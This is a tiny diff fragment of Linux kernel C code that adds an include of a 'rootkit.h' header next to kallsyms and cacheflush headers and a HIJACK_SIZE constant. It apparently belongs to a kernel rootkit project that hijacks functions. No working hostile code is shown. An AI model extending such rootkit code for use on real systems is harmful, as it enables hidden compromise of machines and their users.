@@ -1,6 +1,7 @@
 #include <linux/slab.h>
 #include <asm/cacheflush.h>
 #include <linux/kallsyms.h>
+#include "rootkit.h"
 
 #define HIJACK_SIZE 12
 
